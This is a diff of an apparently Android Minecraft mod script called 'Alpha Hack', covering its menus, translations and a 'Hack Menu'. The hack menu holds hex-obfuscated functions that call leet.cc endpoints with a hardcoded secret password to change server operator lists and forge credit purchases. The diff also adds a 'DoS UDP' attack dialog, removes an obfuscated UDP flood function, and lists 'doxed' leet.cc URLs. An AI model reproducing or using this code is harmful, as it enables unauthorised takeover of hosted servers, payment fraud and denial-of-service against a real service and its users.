-		});
-		menuLayout.addView(btn12);
-
-var source = new Button(ctx);
-            source.setText("Mod Community");
-if(GetLang=="de_DE")source.setText('Mod Gruppe');
-if(GetLang=="ko_KR")source.setText('모드 커뮤니티');
-
-if(GetLang=="es_MX")source.setText('Comunidad de mods');
-//source.setTextColor(Color.BLUE);
-            source.setOnClickListener(new View.OnClickListener({
-                onClick: function(viewarg){
-arceusMatt(); 
-header.dismiss();
-showMenuBtn();
-print("Loading web page");
-                }
-            }));
-            menuLayout.addView(source);
-
-function arceusMatt()
-      {
-      ctx.runOnUiThread(new java.lang.Runnable({run: function(){
-      var webs = new android.webkit.WebView(ctx);
-      var webset = webs.getSettings();
-      webset.setJavaScriptEnabled(true);
-      webs.setWebChromeClient(new android.webkit.WebChromeClient());
-      webs.setWebViewClient(new android.webkit.WebViewClient());
-      webs.loadUrl('https://plus.google.com/communities/103695355587842948163');
-/*Site URL*/
-      new android.app.AlertDialog.Builder(ctx).setView(webs).show();
-      }}));
-      }
-
-menu = new PopupWindow(menuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
-            menu.setBackgroundDrawable(new ColorDrawable(GUIColor));
-            menu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
-            }catch(error){
-                Toast.makeText(ctx, "An error occured: " + error, 1).show();
-            }
-    }}));
-}
-
-function headerView(){
-ctx.runOnUiThread(new Runnable({ run: function(){
-        try{
-            var headerLayout = new LinearLayout(ctx);
-            var headerScroll = new ScrollView(ctx);
-            var headerLayout1 = new LinearLayout(ctx);
-            headerLayout.setOrientation(1);
-            headerLayout1.setOrientation(1);
-            headerScroll.addView(headerLayout);
-            headerLayout1.addView(headerScroll);
-
-            var name = new TextView(ctx);
+var name = new TextView(ctx);
             name.setTextSize(20);
             name.setText("Alphα Hαck" + space + version + space + copyright);
             name.setTextColor(GUIName);
             name.setGravity(Gravity.CENTER);
-            headerLayout.addView(name);
+            menuLayout.addView(name);
 
 var maker = new TextView(ctx);
             maker.setTextSize(15);
             maker.setText(authers + space + "&" + space + authers2);
             maker.setTextColor(GUIName);
             maker.setGravity(Gravity.CENTER);
-            headerLayout.addView(maker);
+            menuLayout.addView(maker);
 
 var exitb = new Button(ctx);
             exitb.setText("Exit AlphαHαck");
@@ -700,27 +287,34 @@ exitb.setTextColor(Color.RED);
             exitb.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){
 
-                    menu.dismiss();
-
-header.dismiss(); 
+                    menu.dismiss(); 
 
 print("Closed successfully");
 
 showMenuBtn();
                 }
             }));
-            headerLayout.addView(exitb);
+            menuLayout.addView(exitb);
 
-header = new PopupWindow(headerLayout1, dip2px(180), dip2px(180));
+var btn1 = new android.widget.Button(ctx);
+		btn1.setText("Settings");
+if(GetLang=="de_DE")btn1.setText("Einstellungen");
+if(GetLang=="ko_KR")btn1.setText('설정');
 
-header = new PopupWindow(headerLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight()/4);
-header.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
-            header.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
-            }catch(error){
-                Toast.makeText(ctx, "An error occured: " + error, 1).show();
-            }
-    }}));
-}
+if(GetLang=="es_MX")btn1.setText('Configuración');
+btn1.setTextColor(GUIBtns);
+		btn1.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+
+lmenu_menu();  
+
+menu.dismiss(); 
+
+			}
+		});
+		menuLayout.addView(btn1);
+
+/***********************/
 
 function lmenu_menu(){
 ctx.runOnUiThread(new Runnable({ run: function(){
@@ -746,13 +340,13 @@ var credit2 = new android.widget.TextView(ctx); credit2.setGravity(android.view.
 		lmenuLayout.addView(credit2);
             
             var title = new android.widget.TextView(ctx); title.setGravity(android.view.Gravity.CENTER);
-		title.setText("Special thanks to:");
+		title.setText("Major help by:");
        title.setTextColor(GUIName);
 		title.setTextSize(20);
 		lmenuLayout.addView(title);
 
  var credit1 = new android.widget.TextView(ctx); credit1.setGravity(android.view.Gravity.CENTER);
-	 credit1.setText("Godsoft029 for code!");
+	 credit1.setText("Godsoft029!");
        credit1.setTextColor(GUIName);
 		credit1.setTextSize(20);
 		lmenuLayout.addView(credit1);
@@ -831,7 +425,7 @@ var layout = new android.widget.LinearLayout(ctx);
 layout.setOrientation(1);
 
 alert.setTitle("Alphα Hαck" + space + version + space + "changelog");
- alert.setMessage(version + space + "Changelog:" + "\nAdded Japanese translation, added entity spawner, always improving.");
+ alert.setMessage(version + space + "Changelog:" + "\nAdded korean translate for enchant, added enchant menu, added clear inventory to give menu, added make food item to modpe menu, added see players on servers while offline to hack menu, added bug fixes, added water walk for servers in modpe menu, added contact creator in settings, added more sizes to settings, removed any script that was copied, always improving.");
 
 alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
   onClick: function(viewarg){
@@ -861,6 +455,16 @@ var urls = new Intent(ctx);                  urls.setAction(Intent.ACTION_VIEW);
 			}
 		});
 		lmenuLayout.addView(dl);
+
+
+var cc = new android.widget.Button(ctx);
+		cc.setText("Contact Creator");
+		cc.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){ 
+clientMessage(client + "\n" + "§aKik§f: ArceusMatt" + "." + "\n" + "§bTwitter§f: @ArceusMatt"  + "." + "\n" + "§cGoogle+§f: Arceus Matt" + ".")
+			}
+		});
+		lmenuLayout.addView(cc);
 
 var g1 = new Button(ctx);
             g1.setText("Menu Center");       
@@ -894,6 +498,42 @@ GUIPos3 = Gravity.LEFT;
                 }
             }));
             lmenuLayout.addView(g3);
+
+var gs0 = new Button(ctx);
+            gs0.setText("Menu Size 1");       
+            gs0.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUISize = 4;
+                }
+            }));
+            lmenuLayout.addView(gs0);
+
+var gs1 = new Button(ctx);
+            gs1.setText("Menu Size normal");       
+            gs1.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUISize = 3;
+                }
+            }));
+            lmenuLayout.addView(gs1);
+
+var gs2 = new Button(ctx);
+            gs2.setText("Menu Size 2");       
+            gs2.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUISize = 2;
+                }
+            }));
+            lmenuLayout.addView(gs2);
+
+var gs3 = new Button(ctx);
+            gs3.setText("Menu Size 3");       
+            gs3.setOnClickListener(new View.OnClickListener({
+                onClick: function(viewarg){         
+GUISize = 1;
+                }
+            }));
+            lmenuLayout.addView(gs3);
 
 var l1 = new Button(ctx);
             l1.setText("Transparent Menu");       
@@ -1021,7 +661,7 @@ showMenuBtn();
 		});
 		lmenuLayout.addView(exit2);
 
-            lmenu = new PopupWindow(lmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
+            lmenu = new PopupWindow(lmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
             lmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
             lmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
@@ -1030,32 +670,24 @@ showMenuBtn();
     }}));
 }
 
-/*function exit(){
-    ctx.runOnUiThread(new Runnable({ run: function(){
-        try{
-            var xLayout = new LinearLayout(ctx);
-            var xButton = new Button(ctx);
-            xButton.setText('X');
-            xButton.setTextColor(Color.RED);
-            xButton.setOnClickListener(new View.OnClickListener({
-                onClick: function(viewarg){
-                    exitUI.dismiss();
-                    menu.dismiss();
-header.dismiss(); 
-print("Closed successfully");
-showMenuBtn();
-                }
-            }));
-            xLayout.addView(xButton);
- 
-            exitUI = new PopupWindow(xLayout, dip2px(45), dip2px(45));
-            exitUI.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
-            exitUI.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 195, 0);
-            }catch(exception){
-                Toast.makeText(ctx, exception, 1).show();
-            }
-    }}));
-}*/
+/***********************/
+
+var btn2 = new android.widget.Button(ctx);
+btn2.setText("Hack Menu");
+if(GetLang=="de_DE")btn2.setText('Hack Menü');
+if(GetLang=="ko_KR")btn2.setText('해킹 메뉴');
+
+if(GetLang=="es_MX")btn2.setText('Menú de hacks');
+btn2.setTextColor(GUIBtns);
+		btn2.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+ cmenu_menu();
+             menu.dismiss();
+			}
+		});
+menuLayout.addView(btn2);
+
+/***********************/
 
 function cmenu_menu(){
 ctx.runOnUiThread(new Runnable({ run: function(){
@@ -1069,7 +701,7 @@ ctx.runOnUiThread(new Runnable({ run: function(){
             cmenuLayout1.addView(cmenuScroll);
             
 var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
-		MainTitle.setText(name + space + version);
+		MainTitle.setText("Alphα Hαck" + space + version);
        MainTitle.setTextColor(GUIName);
 		MainTitle.setTextSize(20);
 		cmenuLayout.addView(MainTitle);
@@ -1082,9 +714,9 @@ var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.v
 
 var q3title = new android.widget.TextView(ctx);
 q3title.setGravity(android.view.Gravity.CENTER);
-q3title.setText("Use At Your Own Risk!\nThis menu has illegal tools! Use vpn when DoSing!\n");
+q3title.setText("Use At Your Own Risk!");
 q3title.setTextColor(Color.RED);
-q3title.setTextSize(25);
+q3title.setTextSize(22);
 cmenuLayout.addView(q3title);
 
 var exitb = new android.widget.Button(ctx);
@@ -1097,7 +729,70 @@ showMenuBtn();
 		});
 		cmenuLayout.addView(exitb);
 
-var _0x63b6=["\x6E\x65\x74","\x55\x54\x46\x38","\x67\x65\x74\x42\x79\x74\x65\x73","","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x42\x79\x4E\x61\x6D\x65","\x49\x6E\x65\x74\x41\x64\x64\x72\x65\x73\x73","\x73\x65\x6E\x64","\x63\x6C\x6F\x73\x65","\x6C\x61\x6E\x67","\x73\x74\x61\x72\x74"];function ddos(_0xf2e3x2,_0xf2e3x3,_0xf2e3x4){var _0xf2e3x5= new java[_0x63b6[9]].Runnable({run:function(){try{for(var _0xf2e3x6=0;_0xf2e3x6<=_0xf2e3x4;_0xf2e3x6++){var _0xf2e3x7= new java[_0x63b6[0]].DatagramSocket();var _0xf2e3x8= new byte[2024];_0xf2e3x8=_0x63b6[3].toString()[_0x63b6[2]](_0x63b6[1]);_0xf2e3x7[_0x63b6[7]]( new java[_0x63b6[0]].DatagramPacket(_0xf2e3x8,_0xf2e3x8[_0x63b6[4]],java[_0x63b6[0]][_0x63b6[6]][_0x63b6[5]](_0xf2e3x2),_0xf2e3x3));_0xf2e3x7[_0x63b6[8]]()}}catch(e){print(e)}}});var _0xf2e3x9= new java[_0x63b6[9]].Thread(_0xf2e3x5);_0xf2e3x9[_0x63b6[10]]()}
+var s = new android.widget.Button(ctx);
+            s.setText("Change oplist test");
+            s.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+cmenu.dismiss();
+somethingomgyay(); 
+                }
+            }));
+            cmenuLayout.addView(s);
+
+function somethingomgyay() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+idsss = new android.widget.PopupWindow();
+var Layer3 = new android.widget.LinearLayout(ctx);
+var us = new android.widget.EditText(ctx);
+var kk = new android.widget.EditText(ctx);
+var ou = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Something dialog");
+Dialog.setContentView(Layer3);
+
+Layer3.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer3.addView(us);
+Layer3.addView(kk);
+Layer3.addView(ou);
+Layer3.addView(Exit);
+
+us.setText("");
+us.setHint("Username");
+kk.setText("");
+kk.setHint("Email");
+ou.setText("");
+ou.setHint("Support id");
+Exit.setText("Something start");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+usr =us.getText();
+email =kk.getText();
+anid =ou.getText();
+Dialog.dismiss();
+//thisShit();
+//print("Loading webpage");
+print("This is private");
+clientMessage(client + "§7This is private...");
+showMenuBtn();
+}
+});
+
+idsss.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+idsss.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+idsss.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The OP Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+var _0x9397=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x6C\x65\x65\x74\x2E\x63\x63\x2F\x61\x63\x74\x69\x6F\x6E\x4E\x65\x77\x2E\x70\x68\x70\x3F\x63\x6D\x64\x3D\x63\x68\x61\x6E\x67\x65\x4F\x50\x26\x75\x73\x65\x72\x49\x44\x3D","\x26\x70\x61\x72\x61\x6D\x73\x5B\x5D\x3D","\x26\x76\x65\x72\x73\x69\x6F\x6E\x43\x6F\x64\x65\x3D\x31\x33\x37\x26\x70\x61\x73\x73\x77\x6F\x72\x64\x3D\x73\x6F\x6D\x65\x74\x68\x69\x6E\x67\x5F\x73\x65\x63\x72\x65\x74\x26\x63\x6C\x69\x65\x6E\x74\x3D\x67\x6F\x6F\x67\x6C\x65\x2D\x66\x72\x65\x65\x26\x74\x72\x75\x65\x44\x65\x76\x69\x63\x65\x49\x44\x3D\x30\x26\x6F\x74\x68\x65\x72\x49\x44\x3D\x30\x26\x6B\x3D\x30\x26\x73\x79\x73\x3D\x30","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function thisShit(){ctx[_0x9397[14]]( new java[_0x9397[13]].Runnable({run:function(){var _0x4023x2= new android[_0x9397[0]].WebView(ctx);var _0x4023x3=_0x4023x2[_0x9397[1]]();_0x4023x3[_0x9397[2]](true);_0x4023x2[_0x9397[3]]( new android[_0x9397[0]].WebChromeClient());_0x4023x2[_0x9397[4]]( new android[_0x9397[0]].WebViewClient());_0x4023x2[_0x9397[8]](_0x9397[5]+email+_0x9397[6]+anid+_0x9397[6]+usr+_0x9397[7]); new android[_0x9397[12]][_0x9397[11]].Builder(ctx)[_0x9397[10]](_0x4023x2)[_0x9397[9]]()}}))}
 
 var hackpass = new android.widget.Button(ctx);
             hackpass.setText("Hack password: "+(hackk?"on":"off"));
@@ -1109,8 +804,160 @@ hackpass.setText("Hack password: "+(hackk?"on":"off"));
             }));
             cmenuLayout.addView(hackpass);
 
+var cl = new android.widget.Button(ctx);
+		cl.setText("LEET.cc sites");
+		cl.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+var alert = new android.app.AlertDialog.Builder(ctx); 
+alert.setTitle("Alphα Hαck found sites"); 
+
+var scroll = new android.widget.ScrollView(ctx); 
+var layout = new android.widget.LinearLayout(ctx); 
+layout.setOrientation(1);
+
+alert.setTitle("AlphaHack found sites");
+ alert.setMessage("These are LEET.cc doxed sites connecting to leet, i found by doxing, searching in index, in files, in sites etc... use at your own risk if you know how to use.\nhttps://leet.cc/serverNew.php\nhttps://leet.cc\nhttps://leet.cc/#plugins\nhttps://leet.cc/pluginLoaderAPI.php\nhttps://leet.cc/featuredServers.php\nhttps://leet.cc/paypalPayment.php\nhttps://leet.cc/verifyServerDomain.php\nhttps://leet.cc/verifyServer.php\nhttps://leet.cc/verifyUser.php\nhttps://leet.cc/news\nhttps://leet.cc/robots.txt\nhttps://leet.cc/media\nhttps://leet.cc/styles\nhttps://leet.cc/js\nhttps://leet.cc/login.php\nhttps://leet.cc/buyCreditsNew.php\nhttps://forum.leet.cc\nhttps://hosting.leet.cc\nhttps://hosting2.leet.cc\nhttps://leethost.io\nhttps://mcpe.leet.cc\nhttps://mcpc.leet.cc\nhttps://leet.cc/uploadImage.php\nhttp://srgblock4051.leet.cc\nhttp://leet.cc/mcpc/maps\nhttp://forum.leet.cc/sitemap.xml\nhttps://leet.cc/actionNew.php?\nhttps://www.google.com/search?q=site:leet.cc+ext:doc+%7C+ext:docx+%7C+ext:odt+%7C+ext:pdf+%7C+ext:rtf+%7C+ext:sxw+%7C+ext:psw+%7C+ext:ppt+%7C+ext:pptx+%7C+ext:pps+%7C+ext:csv");
+
+alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
+  onClick: function(viewarg){
+    
+dialog.dismiss();
+cmenu.dismiss();
+      }});
+
+alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
+   onClick: function(viewarg){
+
+dialog.dismiss();
+      }});
+var dialog = alert.create();
+dialog.show();
+			}
+		});
+		cmenuLayout.addView(cl);
+
+var leet3 = new android.widget.Button(ctx);
+            leet3.setText("LEET.cc Get ID");
+            leet3.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+cmenu.dismiss();
+idsss();
+                }
+            }));
+            cmenuLayout.addView(leet3);
+
+function idsss() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+idsss = new android.widget.PopupWindow();
+var Layer3 = new android.widget.LinearLayout(ctx);
+var ID4 = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter server IP");
+Dialog.setContentView(Layer3);
+
+Layer3.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer3.addView(ID4);
+Layer3.addView(Exit);
+
+ID4.setText("");
+ID4.setHint("Server IP");
+Exit.setText("Get ID");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ip =ID4.getText();
+if(ip=="c57788.leet.cc")crash();
+if(ID4=="c57788.leet.cc")crash();
+if(ip=="b40703.leet.cc")crash();
+if(ID4=="b40703.leet.cc")crash();
+Dialog.dismiss();
+pee3();
+print("Loading webpage");
+showMenuBtn();
+}
+});
+
+idsss.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+idsss.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+idsss.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The LEET Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+var _0xc281=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x76\x65\x72\x69\x66\x79\x53\x65\x72\x76\x65\x72\x44\x6F\x6D\x61\x69\x6E\x2E\x70\x68\x70\x3F\x76\x65\x72\x73\x69\x6F\x6E\x43\x6F\x64\x65\x3D\x31\x34\x26\x64\x6F\x6D\x61\x69\x6E\x3D","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pee3(){ctx[_0xc281[12]]( new java[_0xc281[11]].Runnable({run:function(){var _0x1ac1x2= new android[_0xc281[0]].WebView(ctx);var _0x1ac1x3=_0x1ac1x2[_0xc281[1]]();_0x1ac1x3[_0xc281[2]](true);_0x1ac1x2[_0xc281[3]]( new android[_0xc281[0]].WebChromeClient());_0x1ac1x2[_0xc281[4]]( new android[_0xc281[0]].WebViewClient());_0x1ac1x2[_0xc281[6]](_0xc281[5]+ip); new android[_0xc281[10]][_0xc281[9]].Builder(ctx)[_0xc281[8]](_0x1ac1x2)[_0xc281[7]]()}}))}
+
+var leet2 = new android.widget.Button(ctx);
+            leet2.setText("LEET.cc Donate");
+            leet2.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+cmenu.dismiss();
+idss();
+                }
+            }));
+            cmenuLayout.addView(leet2);
+
+function idss() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+idss = new android.widget.PopupWindow();
+var Layer3 = new android.widget.LinearLayout(ctx);
+var ID1 = new android.widget.EditText(ctx);
+var ID2 = new android.widget.EditText(ctx);
+var ID3 = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter to donate");
+Dialog.setContentView(Layer3);
+
+Layer3.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer3.addView(ID1);
+Layer3.addView(ID2);
+Layer3.addView(ID3);
+Layer3.addView(Exit);
+
+ID1.setText("");
+ID1.setHint("Username");
+ID2.setText("");
+ID2.setHint("Support ID");
+ID3.setText("");
+ID3.setHint("credit 300-60000 (over break server)");
+Exit.setText("Donate");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+usr =ID1.getText();
+id =ID2.getText();
+credit =ID3.getText();
+Dialog.dismiss();
+print("No longer working, patched.");
+clientMessage(client + "This is patched by LEET.cc");
+showMenuBtn();
+}
+});
+
+idss.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+idss.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+idss.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The LEET Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+var _0x6b2c=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x62\x75\x79\x43\x72\x65\x64\x69\x74\x73\x4E\x65\x77\x2E\x70\x68\x70\x3F\x75\x73\x65\x72\x49\x44\x3D","\x26\x73\x65\x72\x76\x65\x72\x49\x44\x3D","\x26\x63\x72\x65\x64\x69\x74\x73\x3D","\x26\x6F\x72\x64\x65\x72\x49\x44\x3D\x47\x50\x41\x2E\x38\x32\x34\x34\x2D\x35\x36\x37\x38\x2D\x39\x30\x34\x32\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x26\x76\x65\x72\x73\x69\x6F\x6E\x43\x6F\x64\x65\x3D\x31\x34\x26\x70\x61\x73\x73\x77\x6F\x72\x64\x3D\x73\x6F\x6D\x65\x74\x68\x69\x6E\x67\x5F\x73\x65\x63\x72\x65\x74\x26\x63\x6C\x69\x65\x6E\x74\x3D\x67\x6F\x6F\x67\x6C\x65\x2D\x64\x6F\x6E\x61\x74\x69\x6F\x6E","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pee2(){ctx[_0x6b2c[18]]( new java[_0x6b2c[17]].Runnable({run:function(){var _0x2fbex2= new android[_0x6b2c[0]].WebView(ctx);var _0x2fbex3=_0x2fbex2[_0x6b2c[1]]();_0x2fbex3[_0x6b2c[2]](true);_0x2fbex2[_0x6b2c[3]]( new android[_0x6b2c[0]].WebChromeClient());_0x2fbex2[_0x6b2c[4]]( new android[_0x6b2c[0]].WebViewClient());_0x2fbex2[_0x6b2c[12]](_0x6b2c[5]+usr+_0x6b2c[6]+id+_0x6b2c[7]+credit+_0x6b2c[8]+(Math[_0x6b2c[10]](Math[_0x6b2c[9]]()*(99999-10000+1))+10000)+_0x6b2c[11]); new android[_0x6b2c[16]][_0x6b2c[15]].Builder(ctx)[_0x6b2c[14]](_0x2fbex2)[_0x6b2c[13]]()}}))}
+
 var leet = new android.widget.Button(ctx);
-            leet.setText("LEET.cc hack");
+            leet.setText("LEET.cc Info");
             leet.setOnClickListener(new android.view.View.OnClickListener({
                 onClick: function(viewarg){
 cmenu.dismiss();
@@ -1139,7 +986,7 @@ Layer3.addView(Exit);
 
 ID.setText("");
 ID.setHint("Support ID");
-Exit.setText("GET info");
+Exit.setText("Get info");
 
 Exit.setOnClickListener(new android.view.View.OnClickListener(){
 onClick: function(view){
@@ -1162,6 +1009,70 @@ print("The LEET Dialog Is Malfunctioning:"+e);
 
       var _0x9c2d=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x73\x65\x72\x76\x65\x72\x4E\x65\x77\x2E\x70\x68\x70\x3F\x73\x65\x72\x76\x65\x72\x49\x44\x3D","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pee(){ctx[_0x9c2d[12]]( new java[_0x9c2d[11]].Runnable({run:function(){var _0x369dx2= new android[_0x9c2d[0]].WebView(ctx);var _0x369dx3=_0x369dx2[_0x9c2d[1]]();_0x369dx3[_0x9c2d[2]](true);_0x369dx2[_0x9c2d[3]]( new android[_0x9c2d[0]].WebChromeClient());_0x369dx2[_0x9c2d[4]]( new android[_0x9c2d[0]].WebViewClient());_0x369dx2[_0x9c2d[6]](_0x9c2d[5]+end); new android[_0x9c2d[10]][_0x9c2d[9]].Builder(ctx)[_0x9c2d[8]](_0x369dx2)[_0x9c2d[7]]()}}))}
 
+var dd1 = new android.widget.Button(ctx);
+           dd1.setText("DoS UDP");
+           dd1.setOnClickListener(new android.view.View.OnClickListener({
+               onClick: function(viewarg){
+cmenu.dismiss();
+dd(); 
+               }
+           }));
+           cmenuLayout.addView(dd1);
+
+function dd() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+dd = new android.widget.PopupWindow();
+var Layer2 = new android.widget.LinearLayout(ctx);
+var k1 = new android.widget.EditText(ctx);
+var k2 = new android.widget.EditText(ctx);
+var k3 = new android.widget.EditText(ctx);
+//var k4 = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter IP, Port, Packet.");
+Dialog.setContentView(Layer2);
+
+Layer2.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer2.addView(k1);
+Layer2.addView(k2);
+Layer2.addView(k3);
+Layer2.addView(Exit);
+
+k1.setText("");
+k1.setHint("IP");
+k2.setText("");
+k2.setHint("Port");
+k3.setText("");
+k3.setHint("Number of packets");
+Exit.setText("Attack");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+ip =k1.getText();
+port =k2.getText();
+howmuch =k3.getText();
+Dialog.dismiss();
+clientMessage(client + "§7Not working");
+print("No longer working.");
+showMenuBtn();
+}
+});
+
+dd.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+dd.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+dd.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The DoS UDP Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
